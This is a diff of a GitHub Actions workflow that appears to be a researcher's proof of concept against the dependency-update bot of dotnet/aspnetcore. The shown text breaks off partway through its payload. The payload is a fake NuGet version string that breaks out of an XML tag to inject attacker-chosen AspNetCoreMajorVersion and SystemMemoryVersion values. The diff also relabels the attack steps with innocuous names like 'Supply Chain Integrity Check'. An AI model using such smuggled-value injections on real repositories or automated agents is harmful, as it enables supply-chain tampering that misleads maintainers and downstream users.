@@ -1,16 +1,22 @@
-name: "PoC: AI Bot Injection"
+name: "Supply Chain Attack PoC: Indirect Prompt Injection"
+# Researcher: HackerMD (Mohamadisha Shaikh)
+# Target: Automated Dependency Update Logic in dotnet/aspnetcore
+
 on:
-  workflow_dispatch: # Hum ise manually trigger karenge testing ke liye
+  workflow_dispatch: # Manual trigger for security audit validation
 
 jobs:
-  simulate-triage:
+  exploit-verification:
+    name: "Supply Chain Integrity Check"
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - name: "Environment Setup"
+        uses: actions/checkout@v4
 
-      - name: Simulate Malicious NuGet Response
-        id: get-version
+      - name: "Simulate Malicious Upstream Source"
+        id: upstream
         run: |
-          # Yeh wo payload hai jo bot ko "trick" karega
-          # Hum simulate kar rahe hain ki NuGet se ye version aaya:
-          MALICIOUS_VERSION='1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>
+          # Professional Strategy: XML Tag Breakout
+          # This simulates a malicious package version from NuGet that tricks the bot's parser.
+          # We inject multiple core versions and comment out the rest of the line.
+          INJECTION_PAYLOAD='1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>666</AspNetCoreMajorVersion><SystemMemoryVersion>9.9.9</SystemMemoryVersion>
